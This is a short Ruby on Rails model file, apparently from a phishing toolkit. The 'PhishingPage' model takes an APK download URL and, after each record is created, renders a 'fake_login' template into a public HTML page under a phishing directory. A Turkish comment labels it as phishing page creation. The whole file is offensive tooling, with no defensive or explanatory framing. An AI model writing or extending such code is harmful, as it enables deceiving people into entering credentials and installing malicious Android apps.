class PhishingPage < ApplicationRecord
  validates :title, presence: true
  validates :apk_url, presence: true, format: { with: URI::regexp(%w[http https]) }

  after_create :generate_page

  private

  def generate_page
    # Phishing sayfası oluştur
    template_path = Rails.root.join('app', 'views', 'social_engineering', 'fake_login.html.erb')
    if File.exist?(template_path)
      template = ERB.new(File.read(template_path))
      rendered_page = template.result(binding)
      output_path = Rails.root.join('public', 'phishing', "#{id}.html")
      FileUtils.mkdir_p(output_path.dirname)
      File.write(output_path, rendered_page)
    end
  end
end

